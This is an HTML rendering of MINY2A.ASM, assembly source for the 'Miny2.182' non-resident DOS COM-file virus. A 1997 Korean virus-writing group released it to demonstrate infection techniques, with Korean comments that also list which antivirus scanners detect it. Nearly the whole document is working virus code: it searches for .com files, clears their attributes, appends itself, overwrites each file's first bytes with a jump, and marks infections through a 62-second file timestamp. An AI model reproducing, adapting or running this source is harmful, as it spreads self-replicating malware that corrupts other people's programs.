<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>MINY2A.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                                                               CVC #02  97/09</span><span class="sc0">
</span><span class="sc1">; Virus Name : Miny2.182</span><span class="sc0">
</span><span class="sc1">; Original Author : KOV (Knight Of Virus) of SVS,COREA</span><span class="sc0">
</span><span class="sc1">; Author : Osiris of CVC,COREA</span><span class="sc0">
</span><span class="sc1">; Date : 1997/08/17</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Type : Non-resident COM infector</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 비상주형 기생형 바이러스이다. Miny2 샘플를 디스어셈블해서 소스로 만든후 약</span><span class="sc0">
</span><span class="sc1">; 간 개조를 했다.</span><span class="sc0">
</span><span class="sc1">; Miny2 시리즈로 비상주바이러스의 여러가지기법을 여러분에게 선 보이고자 한다.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 가장 간단한 비상주기생형 바이러스의 모습이다.</span><span class="sc0">
</span><span class="sc1">; 다음과 같은 문제점이있다.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 1. 에러 처리를 하지 않았다.</span><span class="sc0">
</span><span class="sc1">; 2. TBSCAN 의 인공지능패턴에 검색이된다.</span><span class="sc0">
</span><span class="sc1">; 3. COM 확장자를 가진 EXE 파일도 감염 시켜 버린다.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 이런 문제점은 계속 공개할 Miny2 에서 개선해 나갈 것이다.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; AVP 970812 : PS-MPC based</span><span class="sc0">
</span><span class="sc1">; FINDVIRU 7.73 : VCLb</span><span class="sc0">
</span><span class="sc1">; F-PROT 2.72a,PCSCAN 315,V3,SCAN 9708 : 진단 못함</span><span class="sc0">
</span><span class="sc1">; TBAV : Howard</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;</span><span class="sc0">
            </span><span class="sc9">.MODEL</span><span class="sc0">  </span><span class="sc10">TINY</span><span class="sc0">
            </span><span class="sc9">.CODE</span><span class="sc0">

 </span><span class="sc5">Miny2</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">nop</span><span class="sc0">                         </span><span class="sc1">; 쓰레기값 (아무일도 안한다.)</span><span class="sc0">
            </span><span class="sc6">nop</span><span class="sc0">                         </span><span class="sc1">; 앞부분 복구시 바이러스가 파괴되기</span><span class="sc0">
            </span><span class="sc6">nop</span><span class="sc0">                         </span><span class="sc1">; 때문에 이 값을 넣었다.</span><span class="sc0">
 </span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">Next</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc5">Next</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">bp</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0">   </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Next</span><span class="sc0">        </span><span class="sc1">; BP = 바이러스 시작지점</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">COM_head</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">               </span><span class="sc1">; COM 의 앞부분을 복구한다.</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">movsw</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">movsb</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0">              </span><span class="sc1">; DTA 로 사용해 PSP 가 파괴되므로</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0">              </span><span class="sc1">; 잠시 저장한다.</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">End_Virus</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">repz</span><span class="sc0">  </span><span class="sc6">movsb</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Eh</span><span class="sc0">                </span><span class="sc1">; 파일 찾기</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">00100011B</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">Match_COM</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc5">Find</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0">   </span><span class="sc5">ChkInfected</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc5">Restart</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">End_Virus</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; 원래 DTA 복구</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0">
            </span><span class="sc6">repz</span><span class="sc0">  </span><span class="sc6">movsb</span><span class="sc0">
            </span><span class="sc6">RET</span><span class="sc0">

 </span><span class="sc5">ChkInfected</span><span class="sc4">:</span><span class="sc0">                           </span><span class="sc1">; 감염 여부를 확인한다.</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0096h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; 62 초 인지 검사한다.</span><span class="sc0">
            </span><span class="sc6">and</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">Infect</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Fh</span><span class="sc0">                </span><span class="sc1">; 다음 파일 찾기</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">Find</span><span class="sc0">
 </span><span class="sc5">Infect</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">              </span><span class="sc1">; 읽기/쓰기 속성으로 바꿈</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">009Eh</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D02h</span><span class="sc0">              </span><span class="sc1">; 파일 오픈</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">

            </span><span class="sc6">xchg</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                 </span><span class="sc1">; 파일 핸들 얻기</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">              </span><span class="sc1">; 파일 작성 시간 얻기</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc0">                    </span><span class="sc1">; 작성 시간 저장</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">                </span><span class="sc1">; 앞부분 읽기</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">COM_Head</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; 버퍼 주소</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0003</span><span class="sc0">               </span><span class="sc1">; 3 바이트</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02</span><span class="sc0">                 </span><span class="sc1">; 파일 끝으로 이동</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">lseek</span><span class="sc0">

            </span><span class="sc6">sub</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                  </span><span class="sc1">; 점프값 계산</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">JumpCode</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                </span><span class="sc1">; 바이러스 쓰기</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">End_virus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">start</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">                 </span><span class="sc1">; 처음으로 이동</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">lseek</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                </span><span class="sc1">; 점프 코드 쓰기</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0003</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">JumpCode</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">

            </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc0">                    </span><span class="sc1">; 파일 작성 시간 복구</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">or</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,+</span><span class="sc2">1Fh</span><span class="sc0">               </span><span class="sc1">; 62 초로 만들기</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">                </span><span class="sc1">; 파일 닫기</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">Restart</span><span class="sc0">


 </span><span class="sc5">lseek</span><span class="sc4">:</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">COM_head</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">          </span><span class="sc1">; COM 앞부분</span><span class="sc0">
 </span><span class="sc5">Match_COM</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc12">'*.com'</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">            </span><span class="sc1">; COM 파일 찾기</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc12">'Miny2'</span><span class="sc0">               </span><span class="sc1">; 미니 2</span><span class="sc0">
 </span><span class="sc5">JumpCode</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">0E9h</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">End_Virus</span><span class="sc4">:</span><span class="sc0">

            </span><span class="sc9">END</span><span class="sc0">   </span><span class="sc5">Miny2</span><span class="sc0">

</span></div></body>
</html>
